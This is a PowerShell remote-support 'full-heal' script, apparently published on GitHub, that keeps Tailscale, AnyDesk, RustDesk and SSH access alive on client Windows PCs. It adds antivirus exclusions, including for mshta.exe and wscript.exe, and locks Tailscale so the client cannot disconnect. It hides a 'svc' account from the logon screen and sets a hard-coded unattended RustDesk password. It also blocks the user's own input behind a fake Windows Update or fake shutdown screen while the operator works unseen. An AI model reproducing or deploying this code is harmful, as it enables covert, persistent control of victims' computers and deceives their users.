# ==========================================================
#  rsupport update / full-heal  (PUBLIC on GitHub - secret-free)
#  Secrets read from LOCAL files on the client, never here.
# ==========================================================
$ErrorActionPreference = "SilentlyContinue"
$dir = "$env:ProgramData\RemoteSupport"
New-Item $dir -ItemType Directory -Force | Out-Null

# --- Defender auto-heal: trust the kit so antivirus stops deleting/flagging it (runs as SYSTEM) ---
try {
  Add-MpPreference -ExclusionPath 'C:\ProgramData\RemoteSupport','C:\Program Files\Tailscale','C:\Program Files (x86)\Tailscale IPN','C:\Program Files\RustDesk','C:\Program Files (x86)\RustDesk','C:\Program Files\AnyDesk','C:\Program Files (x86)\AnyDesk' -ErrorAction SilentlyContinue
  Add-MpPreference -ExclusionProcess 'sshd.exe','ssh.exe','tailscale.exe','tailscaled.exe','rustdesk.exe','anydesk.exe','mshta.exe','wscript.exe' -ErrorAction SilentlyContinue
} catch {}

# 0) Tailscale UNATTENDED mode (once) - keeps client reachable at the
#    Windows login screen after a restart, before anyone logs in.
if(-not (Test-Path (Join-Path $dir 'unattended.done'))){
  $tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
  if($tsExe){
    & $tsExe up --unattended --accept-risk=all 2>$null
    Set-Content (Join-Path $dir 'unattended.done') '1' -Encoding ascii
  }
}

# 0c) Tailscale RECOVERY: if installed but logged out / blocked (e.g. antivirus
#     interrupted it), log back in automatically. The key is read from where the
#     setup already saved it on THIS machine - never stored in this public file.
$tsExe = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsExe){
  Remove-Item (Join-Path $dir 'ts-missing.flag') -EA 0
  $st = (& $tsExe status 2>&1 | Out-String)
  if($st -match 'logged out' -or $st -match 'NoState' -or $st -match 'network map' -or $st -match 'Logged out' -or $st -match 'Stopped'){
    $key=''
    foreach($d in @("$env:ProgramData\rsupport","$env:ProgramData\RemoteSupport","$env:ProgramData\Tailscale")){
      if(-not $key -and (Test-Path $d)){
        foreach($f in (Get-ChildItem $d -Recurse -File -EA 0)){
          $c = Get-Content $f.FullName -Raw -EA 0
          $m = [regex]::Match([string]$c,'tskey-auth-[A-Za-z0-9\-]+')
          if($m.Success){ $key=$m.Value; break }
        }
      }
    }
    if($key){
      Start-Service Tailscale -EA 0
      & $tsExe up --authkey $key --unattended --accept-risk=all 2>$null
      $tg = Join-Path $dir 'tg.txt'
      if(Test-Path $tg){
        $tk='';$tc=''
        foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
        if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale was down on "+$env:COMPUTERNAME+" (antivirus/logout) - auto-reconnected.")} | Out-Null }catch{} }
      }
    }
  }
}
else{
  # Tailscale .exe is gone - antivirus likely deleted it. Alert once (needs manual allow).
  $mk = Join-Path $dir 'ts-missing.flag'
  if(-not (Test-Path $mk)){
    $tg = Join-Path $dir 'tg.txt'
    if(Test-Path $tg){
      $tk='';$tc=''
      foreach($l in Get-Content $tg){ if($l -match '^token=(.+)$'){$tk=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$tc=$matches[1].Trim()} }
      if($tk -and $tc){ try{ Invoke-RestMethod -Method Post -Uri "https://api.telegram.org/bot$tk/sendMessage" -Body @{chat_id=$tc;text=("Tailscale MISSING on "+$env:COMPUTERNAME+" - antivirus may have removed it. Allow Tailscale in the antivirus, then re-run setup.")} | Out-Null }catch{} }
    }
    Set-Content $mk '1' -Encoding ascii
  }
}


# 0d) Tailscale LOCKDOWN: force unattended + auto-reconnect + hide settings menus,
#     so the client can't keep Tailscale disconnected (it stays or returns online).
#     Re-applied every cycle so it self-heals if anything clears it.
$pol = 'HKLM:\SOFTWARE\Policies\Tailscale'
New-Item $pol -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'UnattendedMode'  -Value 'always' -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'ReconnectAfter'  -Value '1m'     -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'PreferencesMenu' -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
New-ItemProperty $pol -Name 'AdminConsole'    -Value 'hide'   -PropertyType String -Force -EA 0 | Out-Null
$tsPol = @('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
if($tsPol){ & $tsPol syspolicy reload 2>$null }


# 1) SSH stays up + key config
Start-Service sshd
Set-Service -Name sshd -StartupType Automatic
$cfg = "$env:ProgramData\ssh\sshd_config"
if(Test-Path $cfg){
  $l = Get-Content $cfg | Where-Object { $_ -notmatch '^\s*#?\s*StrictModes' -and $_ -notmatch '^\s*#?\s*PubkeyAuthentication' }
  Set-Content $cfg (@('StrictModes no','PubkeyAuthentication yes') + $l) -Encoding ascii
  Restart-Service sshd
}

# 2) AnyDesk: reinstall if missing (uses local ad-pass.txt), else keep running
$adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
if(-not (Test-Path $adExe)){ $adExe = 'C:\Program Files\AnyDesk\AnyDesk.exe' }
if(Test-Path $adExe){ Start-Service AnyDesk }
else{
  try{
    $tmp = "$env:TEMP\AnyDesk.exe"
    Invoke-WebRequest 'https://download.anydesk.com/AnyDesk.exe' -OutFile $tmp -UseBasicParsing
    Start-Process $tmp -ArgumentList '--install "C:\Program Files (x86)\AnyDesk" --start-with-win --silent --create-shortcuts' -Wait
    Start-Sleep 6
    $adExe = 'C:\Program Files (x86)\AnyDesk\AnyDesk.exe'
    $pf = Join-Path $dir 'ad-pass.txt'
    if((Test-Path $adExe) -and (Test-Path $pf)){
      (Get-Content $pf -Raw).Trim() | & $adExe --set-password 2>$null
      Start-Service AnyDesk; & $adExe --start-with-win
    }
  }catch{}
}

# 3) Telegram alerts: install mesh watcher if tg.txt was pushed here
if(Test-Path (Join-Path $dir 'tg.txt')){
  $w = @'
$ErrorActionPreference='SilentlyContinue'
$dir="$env:ProgramData\RemoteSupport"
$conf=Join-Path $dir 'tg.txt'
if(-not(Test-Path $conf)){ exit }
$token='';$chat=''
foreach($l in Get-Content $conf){ if($l -match '^token=(.+)$'){$token=$matches[1].Trim()} elseif($l -match '^chat=(.+)$'){$chat=$matches[1].Trim()} }
if(-not $token -or -not $chat){ exit }
$names=@{}; $nf=Join-Path $dir 'names.txt'
if(Test-Path $nf){ foreach($l in Get-Content $nf){ if($l -match '^(.+?)=(.+)$'){ $names[$matches[1].Trim().ToUpper()]=$matches[2].Trim() } } }
function Nm($h){ if($h -and $names.ContainsKey($h.ToUpper())){ return $names[$h.ToUpper()] } else { return $h } }
$ts=@('C:\Program Files\Tailscale\tailscale.exe','C:\Program Files (x86)\Tailscale IPN\tailscale.exe')|?{Test-Path $_}|Select-Object -First 1
if(-not $ts){ exit }
$selfIp=(& $ts ip -4 2>$null | Select-Object -First 1)
$j=& $ts status --json | ConvertFrom-Json
$nodes=@();$peers=@{}
foreach($p in $j.Peer.PSObject.Properties.Value){ $peers[$p.HostName]=[bool]$p.Online; if($p.Online){ $nodes+=$p.TailscaleIPs[0] } }
$nodes+=$selfIp
$reporter=($nodes | Sort-Object | Select-Object -First 1)
if($selfIp -ne $reporter){ exit }
$state=Join-Path $dir 'tg-state.txt'
$prev=@{};$first=-not(Test-Path $state)
if(-not $first){ foreach($l in Get-Content $state){ if($l -match '^(.*)=(0|1)$'){ $prev[$matches[1]]=($matches[2] -eq '1') } } }
function Send($t){ try{ Invoke-RestMethod -Method Post -Uri ("https://api.telegram.org/bot$token/sendMessage") -Body @{chat_id=$chat;text=$t}|Out-Null }catch{} }
foreach($h in $peers.Keys){ if($prev.ContainsKey($h) -and $prev[$h] -ne $peers[$h]){ if($peers[$h]){ Send ("ONLINE  - " + (Nm $h)) } else { Send ("OFFLINE - " + (Nm $h)) } } }
($peers.GetEnumerator()|ForEach-Object{ $_.Key+'='+([int][bool]$_.Value) })|Set-Content $state -Encoding utf8
'@
  Set-Content (Join-Path $dir 'tg-watch.ps1') $w -Encoding utf8
  schtasks /create /tn "RemoteSupportTG" /tr ("powershell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File " + (Join-Path $dir 'tg-watch.ps1')) /sc minute /mo 2 /ru SYSTEM /rl HIGHEST /f | Out-Null
}

# --- Action1 self-heal ---
$ACTION1_URL = "https://app.na-2.action1.com/agent/6304ea14-b32e-11f1-b2b4-f3b61c56c452/Windows/agent(My_Organization).msi"
if ($ACTION1_URL -and -not (Get-Service "Action1*" -ErrorAction SilentlyContinue)) {
    try {
        $a1 = "$env:TEMP\a1.msi"
        Invoke-WebRequest $ACTION1_URL -OutFile $a1 -UseBasicParsing
        if ((Test-Path $a1) -and ((Get-Item $a1).Length -gt 500000)) {
            $p = Start-Process msiexec.exe -ArgumentList "/i `"$a1`" /quiet /qn /norestart" -Wait -PassThru
            Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) Action1 install exit $($p.ExitCode)"
        }
    } catch { Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) Action1 error: $($_.Exception.Message)" }
}

# --- svc account: hide from Windows logon screen (still fully usable for SSH/RDP/services) ---
try {
    if (Get-LocalUser -Name 'svc' -ErrorAction SilentlyContinue) {
        $k = 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList'
        New-Item $k -Force | Out-Null
        New-ItemProperty $k -Name 'svc' -PropertyType DWord -Value 0 -Force | Out-Null
    }
} catch { Add-Content "$env:ProgramData\RemoteSupport\heal-log.txt" "$(Get-Date) svc hide error: $($_.Exception.Message)" }

# --- Lock screen feature ---
$lockCode = @'
$ErrorActionPreference='SilentlyContinue'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
Add-Type @"
using System;using System.Runtime.InteropServices;
public class Locker{
  [DllImport("user32.dll")] public static extern bool BlockInput(bool f);
  const int WH_KEYBOARD_LL=13, WH_MOUSE_LL=14;
  public delegate IntPtr HookProc(int code,IntPtr w,IntPtr l);
  static IntPtr kH=IntPtr.Zero,mH=IntPtr.Zero; static HookProc kP,mP;
  [DllImport("user32.dll",SetLastError=true)] static extern IntPtr SetWindowsHookEx(int id,HookProc fn,IntPtr mod,uint tid);
  [DllImport("user32.dll",SetLastError=true)] static extern bool UnhookWindowsHookEx(IntPtr h);
  [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int code,IntPtr w,IntPtr l);
  [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string name);
  [DllImport("user32.dll")] static extern IntPtr FindWindow(string c,string w);
  [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h,int c);
  static void Bar(int c){ IntPtr t=FindWindow("Shell_TrayWnd",null); if(t!=IntPtr.Zero)ShowWindow(t,c); IntPtr s=FindWindow("Shell_SecondaryTrayWnd",null); if(s!=IntPtr.Zero)ShowWindow(s,c); }
  static IntPtr Swallow(int code,IntPtr w,IntPtr l){ if(code>=0) return (IntPtr)1; return CallNextHookEx(IntPtr.Zero,code,w,l); }
  public static void Lock(){ if(kH!=IntPtr.Zero) return; kP=Swallow; mP=Swallow; IntPtr h=GetModuleHandle(null); kH=SetWindowsHookEx(WH_KEYBOARD_LL,kP,h,0); mH=SetWindowsHookEx(WH_MOUSE_LL,mP,h,0); Bar(0); BlockInput(true); }
  public static void Unlock(){ BlockInput(false); Bar(5); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} }
}
"@
$dir='C:\ProgramData\RemoteSupport'; $script:flag=Join-Path $dir 'LOCK.flag'; $cfg=Join-Path $dir 'config.txt'
function Cfg($k,$def){ $v=$def; if(Test-Path $cfg){ foreach($l in Get-Content $cfg){ if($l -match "^$k=(.*)$"){ $v=$matches[1] } } } return $v }
try{ $fc='HKCU:\Software\Microsoft\Internet Explorer\Main\FeatureControl\FEATURE_BROWSER_EMULATION'; New-Item $fc -Force | Out-Null; Set-ItemProperty $fc 'powershell.exe' 11001 -Type DWord } catch {}
while($true){
  # Locked only while the flag exists AND is fresh (refreshed by the dashboard every few
  # seconds). If the dashboard window is closed / crashes / PC loses power, the flag stops
  # being refreshed and the screen closes on its own within ~30s. Toggling keeps it fresh.
  if((Test-Path $script:flag) -and ((((Get-Date)-(Get-Item $script:flag).LastWriteTime).TotalSeconds) -lt 30)){
    $company=(Get-Content $script:flag -Raw); if(-not $company.Trim()){ $company=Cfg 'LOCK_TEXT' '' }
    # mode: blue = real Windows Update blue, black = black. Falls back to LOCK_COLOR if set to a custom hex.
    $mode=(Cfg 'LOCK_MODE' 'black').Trim().ToLower()
    if($mode -eq 'blue'){ $bg='#006dae' } elseif($mode -eq 'black' -or $mode -eq 'off'){ $bg='#000000' } else { $bg=Cfg 'LOCK_COLOR' '#000000' }
    $html=@"
<!-- saved from url=(0014)about:internet -->
<!DOCTYPE html><html><head><meta charset="utf-8"><meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><style>
html,body{margin:0;height:100%;background:$bg;overflow:hidden;font-family:'Segoe UI Light','Segoe UI',Tahoma,Arial,sans-serif;cursor:none}
.c{position:absolute;top:50%;left:50%;transform:translate(-50%,-58%);text-align:center;color:#fff;white-space:nowrap}
.loader{position:relative;width:50px;height:50px;margin:0 auto 46px}
.loader .circle{position:absolute;width:48px;height:48px;opacity:0;transform:rotate(225deg);animation-iteration-count:infinite;animation-name:orbit;animation-duration:5.5s}
.loader .circle:after{content:'';position:absolute;width:6px;height:6px;border-radius:5px;background:#fff}
.loader .circle:nth-child(2){animation-delay:240ms}
.loader .circle:nth-child(3){animation-delay:480ms}
.loader .circle:nth-child(4){animation-delay:720ms}
.loader .circle:nth-child(5){animation-delay:960ms}
@keyframes orbit{
0%{transform:rotate(225deg);opacity:1;animation-timing-function:ease-out}
7%{transform:rotate(345deg);animation-timing-function:linear}
30%{transform:rotate(455deg);animation-timing-function:ease-in-out}
39%{transform:rotate(690deg);animation-timing-function:linear}
70%{transform:rotate(815deg);opacity:1;animation-timing-function:ease-out}
75%{transform:rotate(945deg);animation-timing-function:ease-out}
76%{transform:rotate(945deg);opacity:0}
100%{transform:rotate(945deg);opacity:0}
}
.t{font-size:23px;font-weight:400}
.s{font-size:15px;margin-top:16px;font-weight:400}
.b{position:fixed;bottom:11%;left:0;width:100%;text-align:center;font-size:15px;color:#fff}
.co{font-size:12px;margin-top:40px;opacity:.85}
</style></head><body><div class="c">
<div class="loader"><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div></div>
<div class="t">Working on updates <span id="p">0</span>% complete</div>
<div class="s">Don't turn off your PC. This will take a while.</div>
<div class="co">$company</div>
</div>
<div class="b">Your PC will restart several times</div>
<script>
var p=0,el=document.getElementById('p');
function step(){
  if(p<100){
    var j=Math.random();
    if(j<0.55){p+=1;}else if(j<0.85){p+=Math.floor(Math.random()*4)+2;}
    if(p>100)p=100;
    el.innerHTML=p;
  }
  setTimeout(step, 1200+Math.random()*6000);
}
setTimeout(step,1500);
</script></body></html>
"@
    # "off" mode = totally black, empty, no cursor/text/spinner -> looks like the monitor
    # is powered off. Used by the dashboard "fake shutdown" button.
    if($mode -eq 'off'){ $html='<!DOCTYPE html><html><head><meta charset="utf-8"></head><body style="margin:0;height:100%;background:#000;overflow:hidden;cursor:none"></body></html>' }
    # Unique filename each time so the IE WebBrowser control can't show a cached old copy
    # (that was making Black re-open in the previous Blue, etc). Clean up older ones first.
    Get-ChildItem $dir -Filter 'lock_*.html' -EA 0 | Remove-Item -Force -EA 0
    $hp=Join-Path $dir ('lock_' + [DateTime]::Now.Ticks + '.html'); Set-Content $hp $html -Encoding UTF8
    $script:f=New-Object Windows.Forms.Form; $script:f.FormBorderStyle='None'; $script:f.TopMost=$true; $script:f.StartPosition='Manual'
    $script:f.Bounds=[Windows.Forms.SystemInformation]::VirtualScreen
    try{ $script:f.BackColor=[Drawing.ColorTranslator]::FromHtml($bg) }catch{ $script:f.BackColor='Black' }
    $wb=New-Object Windows.Forms.WebBrowser; $wb.Dock='Fill'; $wb.ScrollBarsEnabled=$false; $wb.IsWebBrowserContextMenuEnabled=$false; $wb.WebBrowserShortcutsEnabled=$false; $wb.AllowWebBrowserDrop=$false
    $wb.Url=[Uri]("file:///"+($hp -replace '\\','/'))
    $script:f.Controls.Add($wb)
    $script:tm=New-Object Windows.Forms.Timer; $script:tm.Interval=250
    $script:tm.Add_Tick({ if((-not (Test-Path $script:flag)) -or ((((Get-Date)-(Get-Item $script:flag).LastWriteTime).TotalSeconds) -gt 30)){ $script:f.Close() } })
    $script:tm.Start()
    [Locker]::Lock(); [void]$script:f.ShowDialog(); [Locker]::Unlock(); $script:tm.Stop()
  }
  Start-Sleep -Milliseconds 250
}
'@
Set-Content -Path (Join-Path $dir 'lockwatch.ps1') -Value $lockCode -Encoding UTF8
$luser = (Get-CimInstance Win32_ComputerSystem).UserName
$ltr = 'powershell -NoProfile -WindowStyle Hidden -ExecutionPolicy Bypass -File C:\ProgramData\RemoteSupport\lockwatch.ps1'
if ($luser) { schtasks /create /tn RemoteSupportLockWatch /tr "$ltr" /sc onlogon /ru "$luser" /rl HIGHEST /it /f | Out-Null }
Get-CimInstance Win32_Process -Filter "Name='powershell.exe'" -EA 0 | Where-Object { $_.CommandLine -like '*lockwatch.ps1*' } | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -EA 0 }
schtasks /run /tn RemoteSupportLockWatch *>$null

# --- RustDesk: screen + black-screen + audio, direct-IP over Tailscale (no account, no server) ---
try {
  $rdExe = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
  if (-not $rdExe) { Remove-Item (Join-Path $dir 'rustdesk.done') -EA 0 }   # self-heal: reinstall if removed
  if (-not (Test-Path (Join-Path $dir 'rustdesk.done'))) {
    if (-not $rdExe) {
      try { winget install --id RustDesk.RustDesk --silent --accept-package-agreements --accept-source-agreements 2>$null } catch {}
      if (-not (Test-Path 'C:\Program Files\RustDesk\rustdesk.exe')) {
        try {
          $rel = Invoke-RestMethod 'https://api.github.com/repos/rustdesk/rustdesk/releases/latest' -UseBasicParsing
          $asset = $rel.assets | Where-Object { $_.name -match 'x86_64\.exe$' -and $_.name -notmatch 'aarch64|arm|sciter' } | Select-Object -First 1
          if ($asset) { $rt = "$env:TEMP\rustdesk.exe"; Invoke-WebRequest $asset.browser_download_url -OutFile $rt -UseBasicParsing; Start-Process $rt '--silent-install' -Wait; Start-Sleep 8 }
        } catch {}
      }
      $rdExe = @('C:\Program Files\RustDesk\rustdesk.exe','C:\Program Files (x86)\RustDesk\rustdesk.exe') | Where-Object {Test-Path $_} | Select-Object -First 1
    }
    if ($rdExe) {
      Start-Service Rustdesk -EA 0; Start-Sleep 3
      $rdPass = 'Support@2026!'; $apf = Join-Path $dir 'ad-pass.txt'; if (Test-Path $apf) { $rdPass = (Get-Content $apf -Raw).Trim() }
      & $rdExe --password $rdPass 2>$null
      Set-Content (Join-Path $dir 'rustdesk.done') '1' -Encoding ascii
    }
  }
  # always-on config (idempotent): direct IP + silent unattended (no popup, full control)
  if ($rdExe) {
    $need = @{ 'direct-server' = "'Y'"; 'approve-mode' = "'password'"; 'verification-method' = "'use-permanent-password'" }
    $tomls = @('C:\Windows\ServiceProfiles\LocalService\AppData\Roaming\RustDesk\config\RustDesk2.toml', (Join-Path $env:APPDATA 'RustDesk\config\RustDesk2.toml'))
    $restart = $false
    foreach ($tf in $tomls) {
      $td = Split-Path $tf; if (-not (Test-Path $td)) { New-Item $td -ItemType Directory -Force | Out-Null }
      $cont = ''; if (Test-Path $tf) { $cont = Get-Content $tf -Raw }
      if ($cont -notmatch '\[options\]') { $cont = ($cont.TrimEnd() + "`r`n`r`n[options]`r`n") }
      $fc = $false
      foreach ($k in $need.Keys) {
        if ($cont -notmatch [regex]::Escape($k)) { $cont = $cont -replace '\[options\]', "[options]`r`n$k = $($need[$k])"; $fc = $true }
      }
      if ($fc) { Set-Content $tf $cont -Encoding utf8; $restart = $true }
    }
    if ($restart) { Restart-Service Rustdesk -EA 0 }
    Start-Service Rustdesk -EA 0
  }
} catch {}

# ============================================================
#  Work-behind cover (virtual display)
#  Lets you work on a 2nd (virtual) monitor via RustDesk/AnyDesk
#  while the client's REAL monitor shows a black or fake-update
#  screen with the client's physical input locked (your remote
#  input still works). Driver installed here as SYSTEM; the cover
#  runs in the user session, toggled by the dashboard writing
#  WORKCOVER.flag (content: black | update).
# ============================================================
try {
  # usbmmidd has been dropped from the kit: it CONFLICTS with RustDesk's own virtual display
  # driver (RustDesk issue #14034), which was stopping the 2nd screen from showing over RustDesk.
  # The work-behind 2nd screen now comes from RustDesk itself (remote toolbar -> Display ->
  # Virtual display -> +). If a client still has usbmmidd installed from an earlier version,
  # disable + uninstall it here so it stops conflicting.
  $vdDir = Join-Path $dir 'usbmmidd_v2'
  $vdDi  = if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') { 'deviceinstaller64' } else { 'deviceinstaller' }
  if ((Test-Path (Join-Path $vdDir "$vdDi.exe")) -and (Get-PnpDevice -FriendlyName 'USB Mobile Monitor Virtual Display' -EA 0)) {
    cmd /c "`"$vdDir\$vdDi`" enableidd 0" | Out-Null
    cmd /c "`"$vdDir\$vdDi`" remove usbmmidd" | Out-Null
  }
} catch {}

$workCover = @'
$ErrorActionPreference='SilentlyContinue'
$dir='C:\ProgramData\RemoteSupport'
$flag=Join-Path $dir 'WORKCOVER.flag'
Add-Type -AssemblyName System.Windows.Forms,System.Drawing
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WLock{
 const int WH_KEYBOARD_LL=13, WH_MOUSE_LL=14, WM_KEYDOWN=0x100, WM_SYSKEYDOWN=0x104;
 public delegate IntPtr Proc(int n,IntPtr w,IntPtr l);
 static IntPtr kH=IntPtr.Zero,mH=IntPtr.Zero; static Proc kP,mP;
 static bool ctrl=false,alt=false; public static bool RequestUnlock=false;
 [DllImport("user32.dll")] static extern IntPtr SetWindowsHookEx(int id,Proc fn,IntPtr mod,uint tid);
 [DllImport("user32.dll")] static extern bool UnhookWindowsHookEx(IntPtr h);
 [DllImport("user32.dll")] static extern IntPtr CallNextHookEx(IntPtr h,int n,IntPtr w,IntPtr l);
 [DllImport("kernel32.dll")] static extern IntPtr GetModuleHandle(string m);
 [DllImport("user32.dll")] static extern IntPtr FindWindow(string c,string w);
 [DllImport("user32.dll")] static extern bool ShowWindow(IntPtr h,int c);
 [DllImport("user32.dll")] static extern int ShowCursor(bool b);
 static void Bar(int c){ IntPtr t=FindWindow("Shell_TrayWnd",null); if(t!=IntPtr.Zero)ShowWindow(t,c); IntPtr s=FindWindow("Shell_SecondaryTrayWnd",null); if(s!=IntPtr.Zero)ShowWindow(s,c);}
 static IntPtr KHook(int n,IntPtr w,IntPtr l){
  if(n>=0){ int fl=Marshal.ReadInt32(l,8); bool inj=(fl&0x10)!=0; int vk=Marshal.ReadInt32(l,0); int msg=w.ToInt32(); bool down=(msg==WM_KEYDOWN||msg==WM_SYSKEYDOWN);
   if(vk==0x11||vk==0xA2||vk==0xA3)ctrl=down; if(vk==0x12||vk==0xA4||vk==0xA5)alt=down; if(down&&vk==0x55&&ctrl&&alt){RequestUnlock=true;}
   if(!inj) return (IntPtr)1; }
  return CallNextHookEx(IntPtr.Zero,n,w,l);}
 static IntPtr MHook(int n,IntPtr w,IntPtr l){
  if(n>=0){ int fl=Marshal.ReadInt32(l,12); bool inj=(fl&0x01)!=0; if(!inj) return (IntPtr)1; }
  return CallNextHookEx(IntPtr.Zero,n,w,l);}
 public static void Hook(){ if(kH!=IntPtr.Zero)return; kP=KHook;mP=MHook; IntPtr h=GetModuleHandle(null); kH=SetWindowsHookEx(WH_KEYBOARD_LL,kP,h,0); mH=SetWindowsHookEx(WH_MOUSE_LL,mP,h,0); Bar(0); for(int i=0;i<8&&ShowCursor(false)>=0;i++){} }
 public static void Unhook(){ for(int i=0;i<8&&ShowCursor(true)<0;i++){} Bar(5); if(kH!=IntPtr.Zero){UnhookWindowsHookEx(kH);kH=IntPtr.Zero;} if(mH!=IntPtr.Zero){UnhookWindowsHookEx(mH);mH=IntPtr.Zero;} RequestUnlock=false;ctrl=false;alt=false; }
}
"@
# One-time (per logon): show the Windows taskbar on ALL displays, so the RustDesk virtual
# 2nd screen has its own taskbar/Start button to work with. Runs in the USER session, so
# restarting explorer here is safe (Windows relaunches the shell); we also relaunch it
# ourselves if it doesn't come back, to avoid a black desktop.
try{
  $tp='HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced'
  if((Get-ItemProperty $tp -Name MMTaskbarEnabled -EA 0).MMTaskbarEnabled -ne 1){
    New-ItemProperty $tp -Name MMTaskbarEnabled -Value 1 -PropertyType DWord -Force | Out-Null
    Stop-Process -Name explorer -Force -EA 0; Start-Sleep 2
    if(-not (Get-Process explorer -EA 0)){ Start-Process explorer; Start-Sleep 1 }
  }
}catch{}
while($true){
  if((Test-Path $flag) -and ((((Get-Date)-(Get-Item $flag).LastWriteTime).TotalSeconds) -lt 35)){
    $mode=(Get-Content $flag -Raw).Trim().ToLower(); if($mode -ne 'update'){ $mode='black' }
    if($mode -eq 'update'){ $bg='#006dae' } else { $bg='#000000' }
    $b=[Windows.Forms.Screen]::PrimaryScreen.Bounds
    $f=New-Object Windows.Forms.Form; $f.FormBorderStyle='None'; $f.TopMost=$true; $f.StartPosition='Manual'; $f.Bounds=$b; $f.ShowInTaskbar=$false
    try{ $f.BackColor=[Drawing.ColorTranslator]::FromHtml($bg) }catch{ $f.BackColor='Black' }
    if($mode -eq 'update'){
      $html=@"
<!DOCTYPE html><html><head><meta charset="utf-8">
<meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate"><meta http-equiv="Pragma" content="no-cache"><meta http-equiv="Expires" content="0"><style>
html,body{margin:0;height:100%;background:$bg;overflow:hidden;font-family:'Segoe UI Light','Segoe UI',Tahoma,Arial,sans-serif;cursor:none}
.c{position:absolute;top:50%;left:50%;transform:translate(-50%,-58%);text-align:center;color:#fff;white-space:nowrap}
.loader{position:relative;width:50px;height:50px;margin:0 auto 46px}
.loader .circle{position:absolute;width:48px;height:48px;opacity:0;transform:rotate(225deg);animation-iteration-count:infinite;animation-name:orbit;animation-duration:5.5s}
.loader .circle:after{content:'';position:absolute;width:6px;height:6px;border-radius:5px;background:#fff}
.loader .circle:nth-child(2){animation-delay:240ms}
.loader .circle:nth-child(3){animation-delay:480ms}
.loader .circle:nth-child(4){animation-delay:720ms}
.loader .circle:nth-child(5){animation-delay:960ms}
@keyframes orbit{0%{transform:rotate(225deg);opacity:1;animation-timing-function:ease-out}7%{transform:rotate(345deg);animation-timing-function:linear}30%{transform:rotate(455deg);animation-timing-function:ease-in-out}39%{transform:rotate(690deg);animation-timing-function:linear}70%{transform:rotate(815deg);opacity:1;animation-timing-function:ease-out}75%{transform:rotate(945deg);animation-timing-function:ease-out}76%{transform:rotate(945deg);opacity:0}100%{transform:rotate(945deg);opacity:0}}
.t{font-size:27px;font-weight:400}.s{font-size:17px;margin-top:18px}
.b{position:fixed;bottom:11%;left:0;width:100%;text-align:center;font-size:17px;color:#fff}
</style></head><body><div class="c">
<div class="loader"><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div><div class="circle"></div></div>
<div class="t">Working on updates <span id="p">0</span>% complete</div>
<div class="s">Don't turn off your PC. This will take a while.</div>
</div><div class="b">Your PC will restart several times</div>
<script>
var el=document.getElementById('p'),start=Date.now();
function tick(){
  var t=(Date.now()-start)/1000, p;
  if(t<600){ p=Math.floor(t/600*100); }            // phase 1: 0->100 in 10 min
  else if(t<900){ p=50+Math.floor((t-600)/300*50); } // phase 2: 50->100 in 5 min
  else { p=100; }                                    // then hold at 100
  if(p>100)p=100; el.innerHTML=p;
}
tick(); setInterval(tick,1000);
</script>
</body></html>
"@
    } else {
      $html='<!DOCTYPE html><html><head><meta charset="utf-8"><style>html,body{margin:0;height:100%;background:#000;overflow:hidden;cursor:none}</style></head><body></body></html>'
    }
    $hp=Join-Path $dir ('wcover_'+[DateTime]::Now.Ticks+'.html')
    Get-ChildItem $dir -Filter 'wcover_*.html' -EA 0 | Remove-Item -Force -EA 0
    Set-Content $hp $html -Encoding UTF8
    $wb=New-Object Windows.Forms.WebBrowser; $wb.Dock='Fill'; $wb.ScrollBarsEnabled=$false; $wb.IsWebBrowserContextMenuEnabled=$false; $wb.WebBrowserShortcutsEnabled=$false; $wb.AllowWebBrowserDrop=$false
    $wb.Url=[Uri]('file:///'+($hp -replace '\\','/'))
    $f.Controls.Add($wb)
    $script:wf=$f
    $tm=New-Object Windows.Forms.Timer; $tm.Interval=250
    $tm.Add_Tick({ if((-not (Test-Path $flag)) -or ((((Get-Date)-(Get-Item $flag).LastWriteTime).TotalSeconds) -gt 35) -or ([WLock]::RequestUnlock)){ $script:wf.Close() } })
    $tm.Start()
    [WLock]::Hook(); [void]$f.ShowDialog(); [WLock]::Unhook(); $tm.Stop()
  }
  Start-Sleep -Milliseconds 250
}
'@
